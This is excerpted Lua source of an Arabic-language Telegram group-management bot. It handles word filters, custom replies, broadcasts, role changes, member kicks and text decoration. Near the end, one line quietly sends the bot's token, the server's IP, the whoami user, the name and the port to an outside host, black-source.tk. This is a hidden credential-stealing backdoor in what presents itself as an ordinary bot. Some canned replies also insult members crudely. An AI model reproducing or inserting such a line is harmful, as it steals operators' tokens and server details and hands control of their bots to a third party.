database:set(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."ＭOHAMED1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ❃∫ ارسل الكلمه الان")  
database:set(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."ＭOHAMED1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."ＭOHAMED1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."ＭOHAMED1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ❃∫ قائمة المنع \n≪━━━━━━𝗠𝗢━━━━━━≫\n"
for k,v in pairs(list) do  
local ＭOHAMED_Msg = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..ＭOHAMED_Msg.."}\n"    
end  
if #list == 0 then  
...
database:del(bot_id..'Configat_12')
send(msg.chat_id_, msg.id_,' ❃∫ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMOHAMED(msg) then
database:set(bot_id..'Set:Configat_12'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ❃∫ ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:Configat_12'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:Configat_12'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ❃∫ تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'Configat_12',text)
database:del(bot_id..'Set:Configat_12'..msg.chat_id_..':'..msg.sender_user_id_)
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ❃∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Configat_12')..')'..'\n ❃∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'محمد').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'محمد')
local ＭOHAMED_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..ＭOHAMED_Msg[math.random(#ＭOHAMED_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and MOHAMED(msg) then 
...
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and MOHAMED(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevMOHAMED(msg) then 
send(msg.chat_id_, msg.id_,' ❃∫ الاذاعه معطله من قبل المطور الاساسي')
return false
end
...
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and MOHAMED(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevMOHAMED(msg) then 
send(msg.chat_id_, msg.id_,' ❃∫ الاذاعه معطله من قبل المطور الاساسي')
return false
end
...
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and MOHAMED(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevMOHAMED(msg) then 
send(msg.chat_id_, msg.id_,' ❃∫  الاذاعه معطله من قبل المطور الاساسي')
return false
end
...
function start_function(extra, result, success)
if tonumber(MOHAMED) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," ❃∫ لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'MOHAMED:User',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_) then
...
if tonumber(MOHAMED) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'MOHAMED:User', result.sender_user_id_)
database:srem(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
...
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'DEV:MOHAMED:T',msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'MOHAMED:User',msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Hamo'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevMOHAMED(msg) then 
local list = database:smembers(bot_id..'List:Rd:MOHAMED')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:MOHAMED:Gif"..v)   
database:del(bot_id.."Add:Rd:MOHAMED:vico"..v)   
database:del(bot_id.."Add:Rd:MOHAMED:stekr"..v)     
database:del(bot_id.."Add:Rd:MOHAMED:Text"..v)   
database:del(bot_id.."Add:Rd:MOHAMED:Photo"..v)
database:del(bot_id.."Add:Rd:MOHAMED:Video"..v)
database:del(bot_id.."Add:Rd:MOHAMED:File"..v)
database:del(bot_id.."Add:Rd:MOHAMED:Audio"..v)
database:del(bot_id..'List:Rd:MOHAMED')
end
send(msg.chat_id_, msg.id_," ❃∫ تم مسح ردود المطور")
end

if text == ("ردود المطور") and DevMOHAMED(msg) then 
local list = database:smembers(bot_id..'List:Rd:MOHAMED')
text = "\n ❃∫ قائمة ردود المطور \n≪━━━━━━𝗠𝗢━━━━━━≫\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:MOHAMED:Gif"..v) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:MOHAMED:vico"..v) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:MOHAMED:stekr"..v) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:MOHAMED:Text"..v) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:MOHAMED:Photo"..v) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:MOHAMED:Video"..v) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:MOHAMED:File"..v) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:MOHAMED:Audio"..v) then
db = 'اغنيه'
end
text = text..""..k.." >> ("..v..") » {"..db.."}\n"
end
...
local test = database:get(bot_id..'Text:MOHAMED:Bot'..msg.sender_user_id_..':'..msg.chat_id_)
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:MOHAMED:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:MOHAMED:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:MOHAMED:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:MOHAMED:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:MOHAMED:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:MOHAMED:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:MOHAMED:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
database:set(bot_id.."Add:Rd:MOHAMED:Photo"..test, photo_in_group)  
end
...
database:set(bot_id..'Text:MOHAMED:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:sadd(bot_id..'List:Rd:MOHAMED', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' ❃∫ تم ازالة الرد العام')
list = {"Add:Rd:MOHAMED:Audio","Add:Rd:MOHAMED:File","Add:Rd:MOHAMED:Video","Add:Rd:MOHAMED:Photo","Add:Rd:MOHAMED:Text","Add:Rd:MOHAMED:stekr","Add:Rd:MOHAMED:vico","Add:Rd:MOHAMED:Gif"}
for k,v in pairs(list) do
database:del(bot_id..v..text)
end
database:del(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Rd:MOHAMED', text)
return false
end
end
if text == 'اضف رد للكل' and DevMOHAMED(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد للكل' and DevMOHAMED(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and not database:get(bot_id..'Reply:MOHAMED'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:MOHAMED:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:MOHAMED:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:MOHAMED:stekr"..text)     
local text1 = database:get(bot_id.."Add:Rd:MOHAMED:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:MOHAMED:Photo"..text)
local video = database:get(bot_id.."Add:Rd:MOHAMED:Video"..text)
local document = database:get(bot_id.."Add:Rd:MOHAMED:File"..text)
local audio = database:get(bot_id.."Add:Rd:MOHAMED:Audio"..text)
------------------------------------------------------------------------
------------------------------------------------------------------------
if text1 then 
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'محمد').." غادر" or text == 'غادر' then  
if MOHAMED(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
...
if database:get(bot_id..'Reply:MOHAMED'..msg.chat_id_) then
database:del(bot_id..'Reply:MOHAMED'..msg.chat_id_)  
...
if not database:get(bot_id..'Reply:MOHAMED'..msg.chat_id_) then
database:set(bot_id..'Reply:MOHAMED'..msg.chat_id_,true)   
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ＭOHAMED')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
ＭOHAMEDdx(msg.chat_id_, msg.id_, ' ❃∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n ❃∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ❃∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ❃∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
*❃م10 ◂ اوامر الاعضاء*
ٴ≪━━━━━━𝗠𝗢━━━━━━≫ٴ
彡 .[𝖬𝖮𝖧𝖠𝖬𝖤𝖣 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/Configat_12)➢ 
]]
...
zh = https.request('https://rudi-dev.tk/Amir1/ＭOHAMED.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n❃∫ قائمه الزخرفه \nٴ❃∫ٴ≪━━━━━━𝗠𝗢━━━━━━≫ٴ❃∫○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ❃∫ٴ≪━━━━━━𝗠𝗢━━━━━━≫ٴ❃∫○ٴ\n❃∫ 彡 .[𝖬𝖮𝖧𝖠𝖬𝖤𝖣 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/Configat_12)➢ ')
end
...
gk = https.request('https://rudi-dev.tk/Amir2/ＭOHAMED.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://rudi-dev.tk/Amir3/ＭOHAMED.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح????","مابوس ولي😌😹","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","خلي يزحفلي وابوسه 🙊😻","كل ليه يه ابوسه كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه??"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'محمد')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' اي رأيك ف دا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وليه اربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
...
ＭOHAMED = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(ＭOHAMED)
...
--------------------------------------------------------------------------------------------------------------
SourceＭOHAMED(data.message_,data)
...
------------------------------------------------------------------------
local ＭOHAMEDAbot = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..text..result.chat_id_)   
if ＭOHAMEDAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..ＭOHAMEDAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local ＭOHAMED1_Msg = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..text..result.chat_id_)   
if ＭOHAMED1_Msg then    
send(msg.chat_id_, msg.id_," ❃∫ "..ＭOHAMED1_Msg)
...
https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..MOHAMED.."&token="..token.."&UserS="..whoami.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
